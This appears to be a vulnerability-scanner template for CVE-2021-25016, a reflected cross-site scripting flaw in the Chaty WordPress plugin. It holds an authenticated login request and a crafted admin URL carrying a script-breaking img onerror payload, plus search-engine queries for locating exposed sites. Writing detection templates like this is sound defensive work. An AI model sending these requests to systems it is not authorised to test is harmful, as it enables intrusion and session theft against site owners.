http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - search=</script><img src onerror=alert(document.domain)>
    - chaty_page_chaty
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=chaty-contact-form-feed&search=%3C%2Fscript%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-25016
info:
  author: luisfelipe146
  classification:
    cpe: cpe:2.3:a:premio:chaty:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-25016
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94471
    epss-score: 0.15671
  description: 'The Chaty WordPress plugin before 2.8.3 and Chaty Pro WordPress plugin
    before 2.8.2 do not sanitise and escape the search parameter before outputting
    it back in the admin dashboard, leading to a Reflected Cross-Site Scripting.

    '
  impact: 'Attackers can inject malicious JavaScript via reflected XSS in the search
    parameter, potentially stealing administrator session cookies or accessing chat
    configuration data.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/chaty/
    framework: wordpress
    max-request: 2
    product: chaty
    publicwww-query: /wp-content/plugins/chaty/
    shodan-query: http.html:/wp-content/plugins/chaty/
    vendor: premio
    verified: true
  name: Chaty < 2.8.2 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/b5035987-6227-4fc6-bc45-1e8016e5c4c0
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25016
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25016
  remediation: Fixed in 2.8.3
  severity: medium
  tags: cve2021,cve,wpscan,wordpress,wp-plugin,xss,authenticated,chaty,premio,vuln
